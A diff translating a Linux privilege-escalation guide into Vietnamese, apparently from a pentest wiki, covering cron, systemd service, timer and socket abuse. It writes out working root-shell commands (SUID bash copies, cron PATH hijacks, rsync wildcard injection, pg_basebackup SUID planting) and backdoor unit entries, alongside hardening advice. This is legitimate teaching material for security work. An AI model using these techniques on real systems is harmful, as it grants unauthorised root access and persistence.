+| VSFTPd (các kết nối FTP đang hoạt động)           | vsftpd               |
+| Apache2 (các phiên xác thực HTTP Basic đang hoạt động) | apache2          |
+| OpenSSH (các phiên SSH đang hoạt động - sử dụng Sudo) | sshd:             |
 
-#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
+#### Regex tìm kiếm/[truffleproc](https://github.com/controlplaneio/truffleproc)
 
 ```bash
 # un truffleproc.sh against your current Bash shell (e.g. $$)
@@ -475,38 +475,38 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 
 ## Scheduled/Cron jobs
 
-### Crontab UI (alseambusher) running as root – web-based scheduler privesc
+### Crontab UI (alseambusher) chạy với quyền root – leo thang đặc quyền qua bộ lập lịch dựa trên web
 
-If a web “Crontab UI” panel (alseambusher/crontab-ui) runs as root and is only bound to loopback, you can still reach it via SSH local port-forwarding and create a privileged job to escalate.<sup>[[1]](#references)[[4]](#references)</sup>
+Nếu một bảng điều khiển web “Crontab UI” (alseambusher/crontab-ui) chạy với quyền root và chỉ bind vào loopback, bạn vẫn có thể truy cập nó thông qua SSH local port-forwarding và tạo một job đặc quyền để leo thang.<sup>[[1]](#references)[[4]](#references)</sup>
 
-Typical chain
-- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
-- Find credentials in operational artifacts:
-  - Backups/scripts with `zip -P <password>`
-  - systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
-- Tunnel and login:
+Chuỗi điển hình
+- Tìm cổng chỉ mở trên loopback (ví dụ: 127.0.0.1:8000) và Basic-Auth realm qua `ss -ntlp` / `curl -v localhost:8000`
+- Tìm thông tin đăng nhập trong các tệp vận hành:
+  - Bản sao lưu/script có `zip -P <password>`
+  - systemd unit hiển thị `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
+- Tạo tunnel và đăng nhập:
 ```bash
 ssh -L 9001:localhost:8000 user@target
 # browse http://localhost:9001 and authenticate
 ```
-- Create a high-priv job and run immediately (drops SUID shell):
+- Tạo một job quyền cao và chạy ngay lập tức (tạo shell SUID):
 ```bash
 # Name: escalate
 # Command:
 cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
 ```
-- Use it:
+- Sử dụng nó:
 ```bash
 /tmp/rootshell -p   # root shell
 ```
 
-Hardening
-- Do not run Crontab UI as root; constrain with a dedicated user and minimal permissions
-- Bind to localhost and additionally restrict access via firewall/VPN; do not reuse passwords
-- Avoid embedding secrets in unit files; use secret stores or root-only EnvironmentFile
-- Enable audit/logging for on-demand job executions
+Gia cố
+- Không chạy Crontab UI dưới quyền root; dùng user riêng và giới hạn quyền ở mức tối thiểu
+- Bind vào localhost và hạn chế quyền truy cập thêm bằng firewall/VPN; không dùng lại mật khẩu
+- Tránh nhúng secrets vào unit files; dùng secret stores hoặc EnvironmentFile chỉ root mới đọc được
+- Bật audit/logging cho các lần thực thi job theo yêu cầu
 
-Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
+Kiểm tra xem có scheduled job nào dễ bị khai thác không. Có thể bạn tận dụng được script chạy dưới quyền root (lỗ hổng wildcard? sửa được các file mà root sử dụng? dùng symlink? tạo các file cụ thể trong thư mục mà root sử dụng?).
 
 ```bash
 crontab -l
@@ -514,23 +514,23 @@ ls -al /etc/cron* /etc/at*
 cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
 ```
 
-If `run-parts` is used, check which names will really execute:
+Nếu sử dụng `run-parts`, hãy kiểm tra những tên nào thực sự sẽ được thực thi:
 
 ```bash
 run-parts --test /etc/cron.hourly
 run-parts --test /etc/cron.daily
 ```
 
-This avoids false positives. A writable periodic directory is only useful if your payload filename matches the local `run-parts` rules.
+Điều này tránh các kết quả dương tính giả. Thư mục định kỳ có quyền ghi chỉ hữu ích nếu tên tệp payload của bạn khớp với các quy tắc `run-parts` trên máy cục bộ.
 
-### Cron path
+### Đường dẫn Cron
 
-For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
+Ví dụ, bên trong _/etc/crontab_ bạn có thể tìm thấy PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
 
-(_Note how the user "user" has writing privileges over /home/user_)
+(_Lưu ý rằng người dùng "user" có quyền ghi trong /home/user_)
 
-If inside this crontab the root user tries to execute some command or script without setting the path. For example: _\* \* \* \* root overwrite.sh_\
-Then, you can get a root shell by using:
+Nếu trong crontab này, người dùng root cố chạy một lệnh hoặc script mà không đặt đường dẫn. Ví dụ: _\* \* \* \* root overwrite.sh_\
+Khi đó, bạn có thể lấy được một shell root bằng cách dùng:
 
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
@@ -538,17 +538,17 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 /tmp/bash -p #The effective uid and gid to be set to the real uid and gid
 ```
 
-### Cron using a script with a wildcard (Wildcard Injection)
+### Cron sử dụng script có wildcard (Wildcard Injection)
 
-If a script is executed by root has a “**\***” inside a command, you could exploit this to make unexpected things (like privesc). Example:
+Nếu một script được thực thi bởi root có “**\***” bên trong một lệnh, bạn có thể khai thác điều này để thực hiện những việc ngoài dự kiến (như privesc). Ví dụ:
 
 ```bash
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
 
-**If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable (even** _**./\***_ **is not).**
+**Nếu wildcard được đặt trước bởi một đường dẫn như** _**/some/path/\***_ **, thì không dễ bị khai thác (ngay cả** _**./\***_ **cũng vậy).**
 
-Read the following page for more wildcard exploitation tricks:
+Đọc trang sau để biết thêm các thủ thuật khai thác wildcard:
 
 
 {{#ref}}
@@ -556,13 +556,13 @@ Read the following page for more wildcard exploitation tricks:
 {{#endref}}
 
 
-### Bash arithmetic expansion injection in cron log parsers
+### Chèn lệnh qua mở rộng số học Bash trong trình phân tích nhật ký cron
 
-Bash arithmetic can interpret untrusted text as an expression. In affected Bash contexts, an array subscript inside that expression can evaluate a command substitution. If a privileged cron/parser places attacker-controlled log text into such an arithmetic comparison, the substitution can run with the parser's identity.<sup>[[22]](#references)</sup> This depends on the exact Bash expression and version; a bare `$(...)0` string in an expanded variable is not, by itself, a reliable demonstration of re-evaluation.
+Bash có thể diễn giải văn bản không đáng tin cậy như một biểu thức số học. Trong một số ngữ cảnh Bash bị ảnh hưởng, chỉ số mảng bên trong biểu thức đó có thể thực thi một phép thay thế lệnh. Nếu cron/parser có đặc quyền đưa văn bản nhật ký do kẻ tấn công kiểm soát vào phép so sánh số học như vậy, phép thay thế có thể chạy với danh tính của parser.<sup>[[22]](#references)</sup> Điều này phụ thuộc vào biểu thức Bash và phiên bản cụ thể; chỉ riêng chuỗi `$(...)0` trong một biến được khai triển không phải là minh chứng đáng tin cậy cho việc đánh giá lại.
 
-The input can also come from file metadata or another field read from a user-writable location. For example, a privileged cleanup script that reads an image `Producer` tag and compares it with `[[ "$producer" -eq "expected" ]]` performs an arithmetic comparison, even though the variable is quoted. Trace the scheduled identity, which files can supply the tag, any transformations before the comparison, and the exact Bash behavior. For text labels, use a string comparison; for numbers, validate the input as decimal digits before arithmetic. See the [Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).
+Đầu vào cũng có thể đến từ metadata của tệp hoặc một trường khác được đọc từ vị trí mà người dùng có thể ghi. Ví dụ, một script dọn dẹp có đặc quyền đọc thẻ `Producer` của ảnh rồi so sánh bằng `[[ "$producer" -eq "expected" ]]` sẽ thực hiện phép so sánh số học, dù biến đã được đặt trong dấu nháy kép. Hãy xác định danh tính mà tác vụ được lên lịch chạy dưới đó, những tệp nào có thể cung cấp thẻ này, mọi phép biến đổi trước khi so sánh và hành vi chính xác của Bash. Với nhãn văn bản, hãy dùng phép so sánh chuỗi; với số, hãy xác thực đầu vào chỉ gồm chữ số thập phân trước khi tính toán số học. Xem [các quy tắc số học của Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).
 
-- Typical vulnerable pattern:
+- Mẫu thường dễ bị khai thác:
   ```bash
   #!/bin/bash
   # Example: parse a log and "sum" a count field coming from the log
@@ -572,18 +572,18 @@ The input can also come from file metadata or another field read from a user-wri
   done < /var/www/app/log/application.log
   ```
 
-- Safe local behavior probe for the array-subscript mechanism (no privileged process or file change):
+- Thăm dò an toàn hành vi cục bộ của cơ chế truy cập phần tử mảng (không có tiến trình đặc quyền hoặc thay đổi tệp):
   ```bash
   code='x[$(printf marker >&2)]'
   [[ 200 -eq "$code" ]]
   # Bash may print "marker" while evaluating the arithmetic operand.
   ```
 
-Trace the actual scheduled script and the literal input path it opens. Even when the log file itself is not writable, a user who can write and traverse its non-sticky parent may be able to replace its directory entry; `namei -l` helps distinguish those permissions. A different writable log path, an unreadable scheduler, or a parser that never evaluates that field as Bash arithmetic does not establish this path.
+Truy vết script thực tế được lên lịch và đường dẫn đầu vào chính xác mà nó mở. Ngay cả khi không thể ghi vào chính tệp log, người dùng có quyền ghi và truy cập thư mục cha không có sticky bit có thể thay thế mục thư mục của tệp; `namei -l` giúp phân biệt các quyền này. Một đường dẫn log khác có thể ghi, scheduler không thể đọc được hoặc parser không bao giờ đánh giá trường đó dưới dạng phép toán số học của Bash đều không chứng minh được khả năng khai thác này.
 
-### Cron script overwriting and symlink
+### Ghi đè cron script và symlink
 
-If you **can modify a cron script** executed by root, you can get a shell very easily:
+Nếu bạn **có thể sửa đổi một cron script** được chạy bằng quyền root, bạn có thể rất dễ lấy được shell:
 
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
@@ -591,57 +591,57 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 /tmp/bash -p
 ```
 
-If the script executed by root uses a **directory where you have full access**, maybe it could be useful to delete that folder and **create a symlink folder to another one** serving a script controlled by you
+Nếu script được root thực thi sử dụng **một thư mục mà bạn có toàn quyền truy cập**, có thể hữu ích nếu xóa thư mục đó và **tạo một thư mục symlink trỏ đến thư mục khác** chứa script do bạn kiểm soát.
 
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
 
-### Symlink validation and safer file handling
+### Xác thực symlink và xử lý tệp an toàn hơn
 
-When reviewing privileged scripts/binaries that read or write files by path, verify how links are handled:
+Khi kiểm tra các script/binary có đặc quyền đọc hoặc ghi tệp theo đường dẫn, hãy xác minh cách chúng xử lý liên kết:
 
-- `stat()` follows a symlink and returns metadata of the target.
-- `lstat()` returns metadata of the link itself.
-- `readlink -f` and `namei -l` help resolve the final target and show permissions of each path component.
+- `stat()` theo symlink và trả về metadata của đích.
+- `lstat()` trả về metadata của chính liên kết.
+- `readlink -f` và `namei -l` giúp phân giải đích cuối cùng và hiển thị quyền của từng thành phần trong đường dẫn.
 
 ```bash
 readlink -f /path/to/link
 namei -l /path/to/link
 ```
 
-For defenders/developers, safer patterns against symlink tricks include:
+Đối với người phòng thủ/nhà phát triển, các cách an toàn hơn để chống lại thủ thuật symlink gồm:
 
-- `O_EXCL` with `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
-- `openat()`: operate relative to a trusted directory file descriptor.
-- `mkstemp()`: create temporary files atomically with secure permissions.
+- `O_EXCL` với `O_CREAT`: thất bại nếu đường dẫn đã tồn tại (ngăn các liên kết/tệp do kẻ tấn công tạo sẵn).
+- `openat()`: thao tác tương đối với file descriptor của một thư mục đáng tin cậy.
+- `mkstemp()`: tạo tệp tạm thời một cách nguyên tử với quyền truy cập an toàn.
 
-### Custom-signed cron binaries with writable payloads
-An ordinary user who can write the exact binary run by a root cron job may cross a privilege boundary, but a custom signature check can reject an unsigned replacement. In the documented case, the root-owned ELF was mode `0760`, allowing a member of its group to write it while the root owner could execute it. A visible process trace showed `objcopy` extracting `.text_sig` before the job ran the binary; the complete verifier script was not readable.<sup>[[2]](#references)</sup>
+### Binary cron được ký tùy chỉnh với payload có thể ghi
+Một người dùng thông thường có thể vượt qua ranh giới đặc quyền nếu họ ghi được vào đúng binary mà cron job của root chạy, nhưng cơ chế kiểm tra chữ ký tùy chỉnh có thể từ chối bản thay thế chưa được ký. Trong trường hợp được ghi nhận, ELF thuộc sở hữu của root có mode `0760`, cho phép thành viên trong group ghi vào tệp trong khi chủ sở hữu root có thể thực thi nó. Dấu vết tiến trình hiển thị cho thấy `objcopy` trích xuất `.text_sig` trước khi job chạy binary; không thể đọc toàn bộ script xác minh.<sup>[[2]](#references)</sup>
 
-The replacement that succeeded was signed with leaked private signing material using an ELF signer. Its [format documentation](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) describes a signature section derived from the executable's `.text`. Merely adding a certificate or a matching string to `.text_sig` is not shown to satisfy the unseen verifier. Check the actual scheduled path, effective write access, root invocation and verifier policy before concluding that a writable signed binary is exploitable. A `.text_sig` section by itself is only a review clue.
+Bản thay thế chạy thành công được ký bằng vật liệu ký riêng tư bị leak, sử dụng một ELF signer. [Tài liệu định dạng](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) mô tả một signature section được tạo từ `.text` của executable. Chỉ thêm certificate hoặc một chuỗi khớp vào `.text_sig` không được chứng minh là đủ để vượt qua verifier không được tiết lộ. Hãy kiểm tra đường dẫn thực tế được lên lịch, quyền ghi hiệu lực, lệnh gọi từ root và chính sách verifier trước khi kết luận rằng một binary có thể ghi và được ký là có thể khai thác. Bản thân section `.text_sig` chỉ là một manh mối cần xem xét.
 
-### Frequent cron jobs
+### Các cron job chạy thường xuyên
 
-You can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.
+Bạn có thể giám sát các tiến trình để tìm những tiến trình được thực thi mỗi 1, 2 hoặc 5 phút. Có thể bạn tận dụng được điều này để leo thang đặc quyền.
 
-For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
+Ví dụ, để **giám sát mỗi 0.1 giây trong 1 phút**, **sắp xếp theo các lệnh được thực thi ít nhất** và xóa các lệnh được thực thi nhiều nhất, bạn có thể làm như sau:
 
 ```bash
 for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
 ```
 
-**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (this will monitor and list every process that starts).
+**Bạn cũng có thể dùng** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (công cụ này sẽ theo dõi và liệt kê mọi process khởi chạy).
 
-### Root backups that preserve attacker-set mode bits (pg_basebackup)
+### Bản sao lưu của root giữ nguyên mode bit do attacker thiết lập (pg_basebackup)
 
-If a root-owned cron wraps `pg_basebackup` (or any recursive copy) against a database directory you can write to, you can plant a **SUID/SGID binary** that will be recopied as **root:root** with the same mode bits into the backup output.<sup>[[26]](#references)</sup>
+Nếu cron do root sở hữu chạy `pg_basebackup` (hoặc bất kỳ thao tác sao chép đệ quy nào) trên một thư mục database mà bạn có thể ghi, bạn có thể đặt một **SUID/SGID binary** để nó được sao chép lại dưới quyền **root:root**, giữ nguyên các mode bit trong thư mục đầu ra của bản sao lưu.<sup>[[26]](#references)</sup>
 
-Typical discovery flow (as a low-priv DB user):
-- Use `pspy` to spot a root cron calling something like `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` every minute.
-- Confirm the source cluster (e.g., `/var/lib/postgresql/14/main`) is writable by you and the destination (`/opt/backups/current`) becomes owned by root after the job.
+Quy trình phát hiện thường gặp (với tư cách là người dùng DB có quyền thấp):
+- Dùng `pspy` để phát hiện cron của root chạy lệnh kiểu như `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` mỗi phút.
+- Xác nhận bạn có quyền ghi vào source cluster (ví dụ: `/var/lib/postgresql/14/main`) và thư mục đích (`/opt/backups/current`) thuộc sở hữu của root sau khi job chạy.
 
-Exploit:
+Khai thác:
 
 ```bash
 # As the DB service user owning the cluster directory
@@ -654,17 +654,17 @@ ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
 /opt/backups/current/bash -p    # root shell without dropping privileges
 ```
 
-This works because `pg_basebackup` preserves file mode bits when copying the cluster; when invoked by root the destination files inherit **root ownership + attacker-chosen SUID/SGID**. Any similar privileged backup/copy routine that keeps permissions and writes into an executable location is vulnerable.
+Điều này hoạt động vì `pg_basebackup` giữ nguyên các bit quyền của file khi sao chép cluster; khi được root gọi, các file đích sẽ kế thừa **quyền sở hữu của root + SUID/SGID do attacker chọn**. Bất kỳ routine sao lưu/sao chép đặc quyền tương tự nào giữ nguyên quyền và ghi vào vị trí có thể thực thi đều dễ bị tấn công.
 
-### Invisible cron jobs
+### Cron job ẩn
 
-It's possible to create a cronjob **putting a carriage return after a comment** (without newline character), and the cron job will work. Example (note the carriage return char):
+Có thể tạo cronjob **bằng cách thêm ký tự carriage return sau một comment** (không có ký tự xuống dòng), và cron job vẫn hoạt động. Ví dụ (lưu ý ký tự carriage return):
 
 ```bash
 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
 ```
 
-To detect this kind of stealth entry, inspect cron files with tools that expose control characters:
+Để phát hiện kiểu mục nhập ẩn này, hãy kiểm tra các tệp cron bằng công cụ hiển thị ký tự điều khiển:
 
 ```bash
 cat -A /etc/crontab
@@ -673,26 +673,26 @@ sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
 xxd /etc/crontab | head
 ```
 
-## Services
+## Dịch vụ
 
-### Writable _.service_ files
+### Có thể ghi vào các tệp _.service_
 
-Check if you can write any `.service` file, if you can, you **could modify it** so it **executes** your **backdoor when** the service is **started**, **restarted** or **stopped** (maybe you will need to wait until the machine is rebooted).\
-For example create your backdoor inside the .service file with **`ExecStart=/tmp/script.sh`**
+Kiểm tra xem bạn có thể ghi vào bất kỳ tệp `.service` nào không. Nếu có, bạn **có thể sửa đổi tệp đó** để **chạy** **backdoor của bạn khi** service được **khởi động**, **khởi động lại** hoặc **dừng** (có thể bạn sẽ cần đợi đến khi máy được khởi động lại).\
+Ví dụ: tạo backdoor của bạn bên trong tệp .service bằng **`ExecStart=/tmp/script.sh`**
 
-### Writable service binaries
+### Có thể ghi vào binary của service
 
-Keep in mind that if you have **write permissions over binaries being executed by services**, you can change them for backdoors so when the services get re-executed the backdoors will be executed.
+Hãy nhớ rằng nếu bạn có **quyền ghi đối với các binary được service thực thi**, bạn có thể thay chúng bằng backdoor để khi service được thực thi lại, backdoor sẽ được chạy.
 
-### systemd PATH - Relative Paths
+### PATH của systemd - Đường dẫn tương đối
 
-You can see the PATH used by **systemd** with:
+Bạn có thể xem PATH mà **systemd** sử dụng bằng:
 
 ```bash
 systemctl show-environment
 ```
 
-If you find that you can **write** in any of the folders of the path you may be able to **escalate privileges**. You need to search for **relative paths being used on service configurations** files like:
+Nếu phát hiện bạn có thể **ghi** vào bất kỳ thư mục nào trong đường dẫn, bạn có thể **leo thang đặc quyền**. Bạn cần tìm các **đường dẫn tương đối** được sử dụng trong các file cấu hình dịch vụ như:
 
 ```bash
 ExecStart=faraday-server
@@ -700,80 +700,80 @@ ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
 ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 ```
 
-Then, create an **executable** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (**Start**, **Stop**, **Reload**), your **backdoor will be executed** (unprivileged users usually cannot start/stop services but check if you can use `sudo -l`).
+Sau đó, tạo một **executable** có **cùng tên với binary theo đường dẫn tương đối** bên trong thư mục systemd PATH mà bạn có quyền ghi. Khi service được yêu cầu thực hiện hành động dễ bị khai thác (**Start**, **Stop**, **Reload**), **backdoor** của bạn sẽ được thực thi (người dùng không có đặc quyền thường không thể start/stop service, nhưng hãy kiểm tra xem bạn có thể dùng `sudo -l` không).
 
-**Learn more about services with `man systemd.service`.**
+**Tìm hiểu thêm về service bằng lệnh `man systemd.service`.**
 
 ## **Timers**
 
-**Timers** are systemd unit files whose name ends in `**.timer**` that control `**.service**` files or events. **Timers** can be used as an alternative to cron as they have built-in support for calendar time events and monotonic time events and can be run asynchronously.
+**Timers** là các unit file của systemd có tên kết thúc bằng `**.timer**`, dùng để điều khiển các file `**.service**` hoặc sự kiện. **Timers** có thể được dùng thay cho cron vì chúng hỗ trợ sẵn các sự kiện thời gian theo lịch và các sự kiện thời gian đơn điệu, đồng thời có thể chạy bất đồng bộ.
 
-You can enumerate all the timers with:
+Bạn có thể liệt kê tất cả các timer bằng lệnh:
 
 ```bash
 systemctl list-timers --all
 ```
 
-### Writable timers
+### Timer có thể ghi
 
-If you can modify a timer you can make it execute some existents of systemd.unit (like a `.service` or a `.target`)
+Nếu bạn có thể sửa đổi một timer, bạn có thể khiến nó thực thi một số unit có sẵn của systemd.unit (chẳng hạn như `.service` hoặc `.target`)
 
 ```bash
 Unit=backdoor.service
 ```
 
-In the documentation you can read what the Unit is:
+Trong tài liệu, bạn có thể đọc về Unit:
 
-> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.
+> Unit cần kích hoạt khi timer này hết hạn. Đối số là tên của một unit, không có hậu tố ".timer". Nếu không chỉ định, giá trị này mặc định là một service có cùng tên với timer unit, nhưng không có hậu tố. (Xem bên trên.) Khuyến nghị đặt tên unit được kích hoạt và tên timer unit giống nhau, ngoại trừ hậu tố.
 
-Therefore, to abuse this permission you would need to:
+Do đó, để lạm dụng quyền này, bạn cần:
 
-- Find some systemd unit (like a `.service`) that is **executing a writable binary**
-- Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** (to impersonate that executable)
+- Tìm một systemd unit (chẳng hạn `.service`) **đang thực thi một binary có thể ghi được**
+- Tìm một systemd unit **đang thực thi một đường dẫn tương đối**, đồng thời bạn có **quyền ghi** vào **systemd PATH** (để giả mạo executable đó)
 
-**Learn more about timers with `man systemd.timer`.**
+**Tìm hiểu thêm về timer bằng `man systemd.timer`.**
 
-### **Enabling Timer**
+### **Bật Timer**
 
-To enable a timer you need root privileges and to execute:
+Để bật timer, bạn cần quyền root và thực thi:
 
 ```bash
 sudo systemctl enable backu2.timer
 Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
 ```
 
-Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
+Lưu ý **timer** được **kích hoạt** bằng cách tạo symlink đến nó tại `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
 
 ## Sockets
 
-Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.<sup>[[14]](#references)</sup>
+Unix Domain Sockets (UDS) cho phép **các tiến trình giao tiếp** với nhau trên cùng máy hoặc giữa các máy theo mô hình client-server. Chúng sử dụng các tệp descriptor Unix tiêu chuẩn để giao tiếp giữa các máy tính và được thiết lập thông qua các tệp `.socket`.<sup>[[14]](#references)</sup>
 
-Sockets can be configured using `.socket` files.
+Có thể cấu hình sockets bằng các tệp `.socket`.
 
-**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:
+**Tìm hiểu thêm về sockets với `man systemd.socket`.** Trong tệp này, có thể cấu hình một số tham số đáng chú ý:
 
-- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
-- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
-- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
-- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
-- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.
+- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Các tùy chọn này khác nhau, nhưng nhìn chung dùng để **chỉ định nơi socket sẽ lắng nghe** (đường dẫn của tệp socket AF_UNIX, địa chỉ IPv4/6 và/hoặc số cổng cần lắng nghe, v.v.)
+- `Accept`: Nhận một đối số boolean. Nếu **true**, một **service instance được khởi chạy cho mỗi kết nối đến** và chỉ socket kết nối được chuyển cho nó. Nếu **false**, tất cả listening socket sẽ được **chuyển cho service unit được khởi chạy**, và chỉ một service unit được khởi chạy để xử lý mọi kết nối. Giá trị này bị bỏ qua đối với datagram socket và FIFO, nơi một service unit duy nhất luôn xử lý toàn bộ lưu lượng đến. **Mặc định là false**. Vì lý do hiệu năng, nên chỉ viết daemon mới theo cách tương thích với `Accept=no`.
+- `ExecStartPre`, `ExecStartPost`: Nhận một hoặc nhiều dòng lệnh, lần lượt được **thực thi trước** hoặc **sau khi** các **socket**/FIFO lắng nghe được **tạo** và liên kết. Từ đầu tiên trong dòng lệnh phải là tên tệp tuyệt đối, theo sau là các đối số dành cho tiến trình.
+- `ExecStopPre`, `ExecStopPost`: Các **lệnh** bổ sung được **thực thi trước** hoặc **sau khi** các **socket**/FIFO lắng nghe được **đóng** và gỡ bỏ.
+- `Service`: Chỉ định tên service unit **cần kích hoạt** khi có **lưu lượng đến**. Thiết lập này chỉ được phép với socket có `Accept=no`. Mặc định, tên service giống với tên socket (thay hậu tố). Trong hầu hết trường hợp, không cần dùng tùy chọn này.
 
-### Writable .socket files
+### Tệp .socket có quyền ghi
 
-If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
-_Note that the system must be using that socket file configuration or the backdoor won't be executed_
+Nếu tìm thấy tệp `.socket` **có quyền ghi**, bạn có thể **thêm** vào đầu phần `[Socket]` một dòng như: `ExecStartPre=/home/kali/sys/backdoor`; khi đó backdoor sẽ được thực thi trước khi socket được tạo. Vì vậy, bạn **có thể sẽ phải chờ máy khởi động lại.**\
+_Lưu ý rằng hệ thống phải đang sử dụng cấu hình của tệp socket đó, nếu không backdoor sẽ không được thực thi_
 
-### Socket activation + writable unit path (create missing service)
+### Socket activation + đường dẫn unit có quyền ghi (tạo service còn thiếu)
 
-Another high-impact misconfiguration is:
+Một cấu hình sai có tác động lớn khác là:
 
-- a socket unit with `Accept=no` and `Service=<name>.service`
-- the referenced service unit is missing
-- an attacker can write into `/etc/systemd/system` (or another unit search path)
+- socket unit có `Accept=no` và `Service=<name>.service`
+- service unit được tham chiếu không tồn tại
+- kẻ tấn công có thể ghi vào `/etc/systemd/system` (hoặc một đường dẫn tìm kiếm unit khác)
 
-In that case, the attacker can create `<name>.service`, then trigger traffic to the socket so systemd loads and executes the new service as root.
+Trong trường hợp đó, kẻ tấn công có thể tạo `<name>.service`, sau đó gửi lưu lượng đến socket để systemd tải và thực thi service mới với quyền root.
 
-Quick flow:
+Luồng thực hiện nhanh:
 
 ```bash
 systemctl cat vuln.socket
@@ -792,17 +792,17 @@ nc -q0 127.0.0.1 9999
 /var/tmp/rootbash -p
 ```
 
-### Writable sockets
+### Socket có quyền ghi
 
-If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.
+Nếu bạn **phát hiện bất kỳ socket nào có quyền ghi** (_ở đây chúng ta đang nói về Unix Sockets, không phải các tệp `.socket` cấu hình_), thì **bạn có thể giao tiếp** với socket đó và có thể khai thác lỗ hổng.
 
-### Enumerate Unix Sockets
+### Liệt kê Unix Sockets
 
 ```bash
 netstat -a -p --unix
 ```
 
-### Raw connection
+### Kết nối thô
 
 ```bash
 #apt-get install netcat-openbsd
@@ -813,54 +813,54 @@ nc -uU /tmp/socket #Connect to UNIX-domain datagram socket
 socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
 ```
 
-**Exploitation example:**
+**Ví dụ khai thác:**
 
 
 {{#ref}}
 ../../network-information/socket-command-injection.md
 {{#endref}}
 
-### HTTP sockets
+### Socket HTTP
 
